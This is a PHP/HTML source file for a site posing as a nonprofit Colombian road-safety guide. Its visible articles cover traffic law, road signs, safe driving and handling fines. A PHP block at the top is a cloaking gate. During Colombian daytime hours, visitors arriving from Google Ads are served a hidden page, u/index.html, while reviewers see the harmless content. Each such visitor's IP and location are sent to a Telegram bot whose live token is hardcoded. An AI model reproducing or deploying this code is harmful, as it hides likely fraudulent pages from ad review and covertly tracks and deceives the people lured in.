<?php

// ========== INTERRUPTOR ==========
// true  = STOP: ignora TODO (hora + filtro), cualquiera ve u/index.html a cualquier hora (para testear tu)
// false = NORMAL: respeta horario 8 AM–9 PM Colombia y solo entra quien viene de Google Ads
$STOP = false;
// =================================


// ========== PASO 1: HORARIO ==========
// Solo dentro de 8:00 AM–9:00 PM hora Colombia se evalúa el filtro (se salta si $STOP)
date_default_timezone_set('America/Bogota');
$horaActual = (int) date('G');
$enHorario = ($horaActual >= 8 && $horaActual < 21);
// =====================================


// ========== PASO 2: FILTRO REFERER / GAD_SOURCE ==========
$referer = $_SERVER['HTTP_REFERER'] ?? '';

$vieneDeGoogleAds = ($STOP || $enHorario)
    && isset($_GET['gad_source'])
    && preg_match('#^https?://([a-z0-9-]+\.)*google\.[a-z.]+/#i', $referer);
// =========================================================


if ($STOP || $vieneDeGoogleAds) {

    $BOT_TOKEN = '7497890468:AAGGItTPfO8JXfESTE8QV_NU22qc-tCsU7A';
    $CHAT_ID = '-5214821466';

    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'];
    $ip = explode(',', $ip)[0];

    $geo = @json_decode(@file_get_contents("http://ip-api.com/json/{$ip}"), true);

    $pais = $geo['country'] ?? 'Desconocido';
    $ciudad = $geo['city'] ?? 'Desconocido';
    $referido = $_SERVER['HTTP_REFERER'] ?? 'Directo';
    $dias = ['Domingo','Lunes','Martes','Miércoles','Jueves','Viernes','Sábado'];
    $meses = ['','Enero','Febrero','Marzo','Abril','Mayo','Junio','Julio','Agosto','Septiembre','Octubre','Noviembre','Diciembre'];
    $hora = $dias[date('w')] . ' ' . date('d') . ' de ' . $meses[date('n')] . ', ' . date('g:i A');

    $mensaje = "🟢 NUEVO VISITANTE 🟢\n"
        . "🌐 IP: {$ip}\n"
        . "📍 País: {$pais}\n"
        . "🏙️ Ciudad: {$ciudad}\n"
        . "🔗 Referido: {$referido}\n"
        . "⏰ Hora: {$hora}";

    $ch = curl_init("https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage");
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query([
            'chat_id' => $CHAT_ID,
            'text' => $mensaje
        ]),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false
    ]);
    curl_exec($ch);
    curl_close($ch);

    header('Cache-Control: no-cache, no-store, must-revalidate, max-age=0');
    header('Pragma: no-cache');
    header('Expires: 0');
    header('Content-Type: text/html; charset=utf-8');

    $html = file_get_contents(__DIR__ . '/u/index.html');
    $html = preg_replace('/<head(\s[^>]*)?>/i', '$0<base href="/u/">', $html, 1);

    echo $html;
    exit;
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="InfoVial - Conocimiento abierto sobre movilidad, normas de tránsito y seguridad vial en Colombia. Sin ánimo de lucro.">
    <title>InfoVial - Conocimiento Abierto de Movilidad y Seguridad Vial</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,600;9..144,700;9..144,800&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <header>
        <div class="container">
            <nav>
                <a href="index.html" class="logo">
                    <div class="logo-art">
                        <span class="logo-circle"></span>
                        <span class="logo-square"></span>
                        <span class="logo-triangle"></span>
                    </div>
                    Info<span>Vial</span>
                </a>
                <ul class="nav-links">
                    <li><a href="index.html" class="active">Inicio</a></li>
                    <li><a href="#quienes-somos">Quiénes Somos</a></li>
                    <li><a href="#educacion">Contenido</a></li>
                    <li><a href="politicas.html">Políticas</a></li>
                    <li><a href="terminos.html">Términos</a></li>
                    <li><a href="contacto.html">Contacto</a></li>
                </ul>
            </nav>
        </div>
    </header>

    <section class="hero">
        <div class="hero-art">
            <div class="floating-shape shape-1"></div>
            <div class="floating-shape shape-2"></div>
            <div class="floating-shape shape-3"></div>
            <div class="floating-shape shape-4"></div>
            <div class="floating-shape shape-5"></div>
        </div>
        <div class="container">
            <div class="hero-content">
                <span class="hero-badge">Conocimiento Abierto · Sin Ánimo de Lucro</span>
                <h1>Movilidad consciente, <span class="highlight">vías más seguras</span></h1>
                <p>Una guía ciudadana para quienes circulan por las vías colombianas. Entiende las reglas, conoce tus derechos y aprende a protegerte a ti y a quienes te rodean.</p>
                <a href="#educacion" class="btn-explore">Ver contenido</a>
            </div>
        </div>
    </section>

    <section id="quienes-somos" class="about-section">
        <div class="container">
            <div class="section-header">
                <span class="section-tag">Sobre nosotros</span>
                <h2>Quiénes Somos</h2>
                <div class="header-line"></div>
            </div>

            <div class="about-grid">
                <div class="about-card mission">
                    <div class="card-icon">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                            <circle cx="12" cy="12" r="10"/>
                            <path d="M12 6v6l4 2"/>
                        </svg>
                    </div>
                    <h3>Por qué existimos</h3>
                    <p>InfoVial existe porque creemos que la información sobre las vías no debería estar dispersa, llena de tecnicismos o atada a trámites costosos. Reunimos en un solo lugar lo esencial para que cualquier persona —sin importar si conduce, camina o usa la bicicleta— pueda moverse con más confianza. La movilidad segura empieza cuando todos compartimos el mismo lenguaje básico.</p>
                </div>

                <div class="about-card vision">
                    <div class="card-icon">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                            <circle cx="12" cy="12" r="3"/>
                        </svg>
                    </div>
                    <h3>Hacia dónde vamos</h3>
                    <p>Imaginamos un país donde la cultura vial no se enseñe solo cuando llega el primer comparendo, sino como parte natural de lo que significa ser ciudadano. Queremos que InfoVial sea ese recurso al que las personas vuelven cuando tienen una duda, antes de entrar a un trámite o después de ver una noticia. Un lugar donde la información es clara, gratuita y sin letras pequeñas.</p>
                </div>

                <div class="about-card values">
                    <div class="card-icon">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                            <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/>
                        </svg>
                    </div>
                    <h3>Cómo trabajamos</h3>
                    <ul class="values-list">
                        <li><strong>Siempre gratis:</strong> ningún contenido tiene costo, nunca lo tendrá.</li>
                        <li><strong>Sin intermediarios:</strong> no gestionamos trámites ni cobramos comisiones.</li>
                        <li><strong>Fuentes verificables:</strong> normativa vigente y datos contrastados.</li>
                        <li><strong>Lenguaje claro:</strong> sin jerga jurídica innecesaria.</li>
                        <li><strong>Actualización constante:</strong> revisamos el contenido cuando cambian las normas.</li>
                    </ul>
                </div>

                <div class="about-card commitment">
                    <div class="card-icon">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
                            <path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/>
                        </svg>
                    </div>
                    <h3>Lo que no hacemos</h3>
                    <p>Para que quede claro desde el principio: InfoVial no es una entidad oficial, no expedimos documentos, no tramitamos licencias, no vendemos SOAT ni gestionamos comparendos. Tampoco representamos legalmente a nadie ni ofrecemos asesoría personalizada. Somos un sitio educativo. Punto. Si alguien te contacta diciendo representarnos para cobrarte un servicio, no lo haga caso: no es nosotros.</p>
                </div>
            </div>
        </div>
    </section>

    <section id="educacion" class="education-section">
        <div class="container">
            <div class="section-header">
                <span class="section-tag">Contenido</span>
                <h2>Guías Esenciales</h2>
                <div class="header-line"></div>
            </div>

            <!-- Artículo 1: Contexto normativo -->
            <article class="edu-article">
                <div class="article-header">
                    <div class="article-number">01</div>
                    <h3>Cómo Funciona el Tránsito en Colombia: Normas, Entidades y Actores</h3>
                </div>
                <div class="article-content">
                    <div class="article-intro">
                        <p>Antes de memorizar señales o velocidades, conviene entender el mapa completo: qué normas rigen, quién las aplica y cuál es tu lugar dentro del sistema como usuario de las vías.</p>
                    </div>

                    <div class="art-period">
                        <h4>La norma que lo ordena todo</h4>
                        <p>El Código Nacional de Tránsito Terrestre, conocido oficialmente como Ley 769 de 2002, es la columna vertebral de toda la regulación vial en Colombia. Fue expedido para reemplazar un decreto de 1970 que había quedado corto frente a la realidad motorizada del país. Desde entonces ha sido modificado varias veces, entre otras por la Ley 1383 de 2010 que endureció las sanciones por embriaguez al volante, y por la Ley 1696 de 2013 que introdujo consecuencias penales para quienes causen lesiones o muertes conduciendo bajo efectos de alcohol o drogas.</p>
                        <p>Este código define lo que significa ser peatón, ciclista, motociclista o conductor, qué derechos y deberes tiene cada uno, qué documentos se necesitan para circular y qué pasa cuando alguien incumple. Todo lo demás —resoluciones, decretos reglamentarios, manuales técnicos— se desprende de ahí. Conocer la existencia de esta ley, aunque no la memorices, ya es un paso importante porque te permite verificar información y no dejarte llevar por rumores.</p>
                    </div>

                    <div class="art-period">
                        <h4>Quién vigila qué</h4>
                        <p>En Colombia varias entidades trabajan en paralelo en el tema vial, y saber a cuál acudir te ahorra tiempo y frustración. El Ministerio de Transporte es la cabeza: dicta las políticas, firma los grandes manuales y emite las resoluciones que afectan a todo el país. La Agencia Nacional de Seguridad Vial, creada en 2013, se encarga específicamente de prevenir siniestros y coordinar el Plan Nacional de Seguridad Vial.</p>
                        <p>En el nivel operativo, cada departamento y cada municipio tiene su propio organismo de tránsito. Son ellos los que imponen comparendos en la ciudad, expiden licencias, matriculan vehículos y atienden trámites cotidianos. La Policía de Tránsito y Transporte se especializa en las carreteras nacionales y apoya a las autoridades locales. Y la Superintendencia de Transporte vigila a las empresas del sector y a los centros de enseñanza autorizados. Si te preguntas "¿a dónde llevo este papel?", la respuesta casi siempre está en el organismo de tránsito de tu ciudad.</p>
                    </div>

                    <div class="art-period">
                        <h4>El : el gran registro digital</h4>
                        <p>El Registro Único Nacional de Tránsito es una base de datos que centraliza la información de conductores, vehículos, empresas de transporte y sanciones. Antes del , cada organismo de tránsito tenía sus propios archivos y era común que la información no coincidiera entre ciudades. Hoy, cualquier autoridad del país puede verificar en segundos si una licencia está vigente, si un vehículo tiene comparendos o si un conductor tiene antecedentes.</p>
                        <p>Como ciudadano puedes consultar tu información en el portal oficial del  de forma gratuita. Es una costumbre sana: revisar cada cierto tiempo que no haya multas de las que no te enteraste, que tu licencia no esté por vencer y que tu vehículo aparezca correctamente registrado a tu nombre. Muchos problemas administrativos se detectan antes de volverse serios con solo esta consulta periódica.</p>
                    </div>

                    <div class="art-period">
                        <h4>Tú, como actor vial</h4>
                        <p>El código te reconoce según cómo te mueves por la vía. Si caminas, eres peatón y tienes prelación en los cruces demarcados. Si vas en bicicleta, perteneces al grupo de usuarios vulnerables y tienes derecho a un espacio seguro, idealmente una ciclovía. Si montas moto, estás obligado a usar casco certificado y chaleco reflectivo. Si conduces un automóvil, asumes una responsabilidad mayor porque tu vehículo puede causar más daño.</p>
                        <p>Este enfoque por actores es importante porque reconoce que no todos llegamos a la vía en las mismas condiciones. Las normas pensadas para un conductor de carro no pueden aplicarse tal cual a un peatón. La misma vía es un escenario compartido donde cada quien tiene un rol, y ese rol determina qué se espera de ti y qué puedes esperar de los demás.</p>
                    </div>
                </div>
            </article>

            <!-- Artículo 2: Señales -->
            <article class="edu-article">
                <div class="article-header">
                    <div class="article-number">02</div>
                    <h3>Señales de Tránsito: El Código Visual que Todos Deberíamos Entender</h3>
                </div>
                <div class="article-content">
                    <div class="article-intro">
                        <p>Las señales no son decoración urbana. Son un sistema de comunicación diseñado para que todos, sin importar idioma o nivel educativo, entiendan las mismas reglas.</p>
                    </div>

                    <div class="technique-section">
                        <h4>Por qué cada señal tiene la forma que tiene</h4>
                        <p>La forma de una señal te dice qué tipo de mensaje trae antes incluso de leerla. Los rombos amarillos son advertencias: ojo con lo que viene. Los círculos con borde rojo son prohibiciones: no hagas esto. Los círculos azules son obligaciones: haz esto. Los rectángulos verdes, azules o blancos son información útil: destinos, servicios, distancias. Y el octágono rojo —el PARE— tiene su forma única precisamente para que lo reconozcas incluso si está cubierto de polvo o visto por el espejo retrovisor.</p>
                        <p>La combinación amarillo-negro que predomina en las señales preventivas no es casual. Es la pareja de colores con mayor contraste visible al ojo humano, incluso en condiciones de baja luz. Los diseñadores de señalización llevan décadas refinando estos detalles con base en estudios de percepción.</p>
                    </div>

                    <div class="technique-section">
                        <h4>Las señales que más se ignoran</h4>
                        <p>La señal de PARE se ignora mucho más de lo que se admite. Detenerse completamente —no solo disminuir— es obligatorio, y la razón es que una parada total te da el tiempo suficiente para verificar que no viene nadie. En intersecciones sin semáforo, esta detención salva vidas.</p>
                        <p>Los límites de velocidad son otra señal incomprendida. En Colombia, la velocidad máxima general en zona urbana es de 50 kilómetros por hora; en zonas residenciales y escolares baja a 30. En carreteras nacionales, los automóviles pueden ir hasta 80 y el transporte público hasta 60. Estos límites no son sugerencias: están calculados para que, en caso de atropellar a un peatón, la posibilidad de que sobreviva sea razonable.</p>
                        <p>Las líneas amarillas continuas en la carretera son equivalentes a una señal de prohibición: no se puede adelantar porque la visibilidad o la geometría de la vía hacen la maniobra peligrosa. Cruzarlas es una infracción grave, pero más importante, expone a quien la cruza y al que viene en sentido contrario a una colisión frontal.</p>
                    </div>

                    <div class="technique-section">
                        <h4>El semáforo y sus secretos</h4>
                        <p>El ciclo del semáforo está calibrado para permitir que un vehículo en aproximación pueda detenerse o despejar la intersección sin frenazo brusco. La luz amarilla no significa "acelera para pasar": significa "prepárate para detenerte". Si ya estás tan cerca que detenerte sería peligroso, despejas la intersección; si todavía puedes parar, paras.</p>
                        <p>Los semáforos inteligentes modernos ajustan sus tiempos según el flujo real, y muchos tienen cámaras que detectan cuándo alguien cruza en rojo. Estas cámaras envían la evidencia al sistema de comparendos automáticamente. La discusión no es si están bien o mal ubicadas: están ahí y funcionan.</p>
                    </div>
                </div>
            </article>

            <!-- Artículo 3: Conducción segura -->
            <article class="edu-article">
                <div class="article-header">
                    <div class="article-number">03</div>
                    <h3>Moverse con Seguridad: Hábitos que Reducen el Riesgo</h3>
                </div>
                <div class="article-content">
                    <div class="article-intro">
                        <p>La seguridad vial no es suerte. Es el resultado de decisiones pequeñas, repetidas, que con el tiempo se convierten en hábitos y protegen tu vida sin que lo notes.</p>
                    </div>

                    <div class="theory-section">
                        <h4>El factor humano es casi todo</h4>
                        <p>Las investigaciones sobre siniestros viales coinciden en un dato incómodo: más del 90% tienen alguna causa humana. No siempre significa culpa —a veces es simple mala suerte combinada con una decisión marginal— pero sí significa que la mayoría se podría haber evitado. Los tres factores humanos más frecuentes son la distracción, el exceso de velocidad y el consumo de alcohol o drogas.</p>
                        <p>La distracción más común hoy es el teléfono. Un mensaje de texto a 60 kilómetros por hora implica conducir casi medio campo de fútbol sin mirar la vía. Ningún mensaje es tan urgente como para justificar ese riesgo, y sin embargo seguimos haciéndolo. Lo más honesto es aceptarlo y tomar una decisión: el celular entra a modo conducción o se guarda fuera del alcance.</p>
                    </div>

                    <div class="theory-section">
                        <h4>La distancia es tu colchón</h4>
                        <p>La regla de los tres segundos es simple y poderosa: elige un punto fijo, cuenta desde que el carro de adelante lo pasa hasta que tú lo pasas. Si son menos de tres segundos, estás muy cerca. En lluvia, niebla o de noche, multiplica por dos. La distancia es el tiempo que tu cerebro necesita para reaccionar y tus frenos para actuar.</p>
                        <p>Otra forma de pensar la distancia: siempre debes tener una ruta de escape. Si alguien frena delante, si un peatón cruza, si el carro de al lado hace una maniobra inesperada, ¿tienes hacia dónde moverte? Conducir rodeado, en el punto ciego de un camión o pegado a una barrera, elimina tus opciones. Deja espacio.</p>
                    </div>

                    <div class="theory-section">
                        <h4>Los usuarios vulnerables</h4>
                        <p>Peatones, ciclistas y motociclistas son los que pierden en cualquier choque. No tienen carrocería, no tienen bolsas de aire, no tienen nada entre ellos y el pavimento. Cuando conduces un automóvil, tu responsabilidad con ellos es mayor simplemente porque tu vehículo pesa mucho más.</p>
                        <p>Al adelantar a un ciclista, deja al menos un metro y medio de separación. Al abrir la puerta de un carro estacionado, hazlo con la mano opuesta para girar el cuerpo y ver si viene un ciclista. Al aproximarte a un cruce peatonal, reduce la velocidad aunque no veas a nadie: los niños y adultos mayores aparecen de forma imprevisible. Al ver una moto en el espejo, acepta que puede estar en tu punto ciego aunque no la veas directamente.</p>
                    </div>

                    <div class="theory-section">
                        <h4>Clima y carretera</h4>
                        <p>Colombia tiene de todo: lluvia torrencial, niebla en las montañas, pendientes pronunciadas, sol cegador. Cada condición pide un ajuste. Los primeros minutos de una lluvia son los más peligrosos porque el agua mezclada con aceite en el pavimento crea una película resbaladiza. Reduce velocidad, frena suavemente, aumenta distancia.</p>
                        <p>En niebla densa, usa luces bajas —nunca altas, crean un efecto pared— y sigue la línea blanca del borde derecho como guía. En pendientes largas de bajada, no te pegues al freno: usa la caja para reducir marchas y que el motor sirva de freno. El sobrecalentamiento del sistema de frenos es causa recurrente de accidentes en la montaña colombiana.</p>
                    </div>
                </div>
            </article>

            <!-- Artículo 4: Derechos y trámites -->
            <article class="edu-article">
                <div class="article-header">
                    <div class="article-number">04</div>
                    <h3>Tus Documentos y Tus Derechos: Guía Práctica</h3>
                </div>
                <div class="article-content">
                    <div class="article-intro">
                        <p>La parte menos interesante pero más importante: qué documentos necesitas, qué plazos manejar y qué derechos tienes cuando algo sale mal.</p>
                    </div>

                    <div class="appreciation-section">
                        <h4>Los tres documentos esenciales</h4>
                        <p>Para circular con un vehículo necesitas tres cosas al día: licencia de conducción vigente, SOAT vigente y certificado de revisión técnico-mecánica cuando corresponda. La licencia se renueva cada diez años (menos tiempo si eres mayor de 60). El SOAT es anual y cubre a las víctimas de accidentes —no los daños materiales—, por eso no reemplaza un seguro todo riesgo. La revisión técnico-mecánica empieza a ser obligatoria para vehículos particulares a los seis años de matriculados, y después se hace cada año.</p>
                        <p>Los tres documentos son exigibles en cualquier retén y su ausencia o vencimiento genera comparendo inmediato. Llevarlos físicamente o en la app del  son igualmente válidos hoy en día, pero revisa que tu ciudad acepte el formato digital antes de depender solo de él.</p>
                    </div>

                    <div class="appreciation-section">
                        <h4>Qué hacer si te imponen un comparendo</h4>
                        <p>Recibir un comparendo no significa que debas pagarlo inmediatamente. La ley te da un plazo y dos opciones: aceptar y pagar con descuento, o ir a una audiencia a controvertirlo. Si pagas dentro de los primeros cinco días hábiles, tienes 50% de descuento; hasta los once días, 25%. Después de ese plazo pagas el monto completo.</p>
                        <p>Si no estás de acuerdo con el comparendo, puedes pedir audiencia de descargos dentro de los mismos once días hábiles. En esa audiencia presentas pruebas y tu versión. Si la decisión final te parece injusta, procede recurso de reposición ante la misma autoridad y, si te mantienen la sanción, recurso de apelación al superior. En casos donde se vulnere el debido proceso, la tutela sigue siendo un camino válido.</p>
                    </div>

                    <div class="appreciation-section">
                        <h4>Si estás involucrado en un accidente</h4>
                        <p>Tu primera obligación es detenerte. Abandonar el lugar de un accidente es delito, incluso si crees que no fue tu culpa. Lo segundo es auxiliar a los heridos; la vida de una persona siempre está por encima de la discusión sobre responsabilidades. Llama al 123 o pide ayuda, y espera a las autoridades sin mover los vehículos —salvo que estén en una posición que cause riesgo adicional.</p>
                        <p>El SOAT cubre la atención médica de todas las víctimas hasta cierto tope, sin importar quién tuvo la culpa. Eso es intencional: la idea es que nadie muera por falta de atención mientras se define lo legal. Los daños materiales se discuten después por vía civil, y si hay lesionados graves o muertos puede haber investigación penal, especialmente si hubo alcohol o drogas de por medio.</p>
                    </div>

                    <div class="appreciation-section">
                        <h4>Consejos que se aprenden con experiencia</h4>
                        <ul>
                            <li><strong>Guarda todo:</strong> recibos, certificados, fotos del vehículo al comprar SOAT. Te salvan ante errores administrativos.</li>
                            <li><strong>Consulta el  cada cierto tiempo:</strong> los comparendos que no conoces pueden acumularse en silencio.</li>
                            <li><strong>Paga directo:</strong> evita intermediarios que cobran por trámites que puedes hacer solo en el portal oficial.</li>
                            <li><strong>Fotografía tu escena:</strong> si estás en un accidente leve, fotos de la posición de los vehículos son prueba valiosa.</li>
                            <li><strong>No firmes sin leer:</strong> ni acuerdos en la vía ni documentos en el organismo de tránsito. Si tienes dudas, pide tiempo.</li>
                            <li><strong>Respeta los plazos:</strong> los descuentos y los recursos tienen fechas estrictas. Perder un día puede costarte dinero.</li>
                        </ul>
                    </div>
                </div>
            </article>
        </div>
    </section>

    <section class="cta-section">
        <div class="container">
            <div class="cta-content">
                <h2>La información clara es la mejor prevención</h2>
                <p>InfoVial seguirá siendo gratuito mientras exista. Sin anuncios, sin ventas, sin letra pequeña. Solo contenido útil para moverte mejor.</p>
            </div>
        </div>
    </section>

    <footer>
        <div class="container">
            <div class="footer-content">
                <div class="footer-section footer-about">
                    <div class="footer-logo">
                        <div class="logo-art">
                            <span class="logo-circle"></span>
                            <span class="logo-square"></span>
                            <span class="logo-triangle"></span>
                        </div>
                        Info<span>Vial</span>
                    </div>
                    <p>Proyecto ciudadano e independiente para difundir conocimiento abierto sobre movilidad y seguridad vial en Colombia.</p>
                </div>
                <div class="footer-section">
                    <h4>Navegación</h4>
                    <ul>
                        <li><a href="index.html">Inicio</a></li>
                        <li><a href="#quienes-somos">Quiénes Somos</a></li>
                        <li><a href="#educacion">Contenido</a></li>
                    </ul>
                </div>
                <div class="footer-section">
                    <h4>Legal</h4>
                    <ul>
                        <li><a href="politicas.html">Política de Privacidad</a></li>
                        <li><a href="terminos.html">Términos y Condiciones</a></li>
                        <li><a href="contacto.html">Contacto</a></li>
                    </ul>
                </div>
            </div>
            <div class="footer-bottom">
                <p>&copy; 2026 InfoVial. Proyecto sin ánimo de lucro. Todos los derechos reservados.</p>
            </div>
        </div>
    </footer>

</body>
</html>
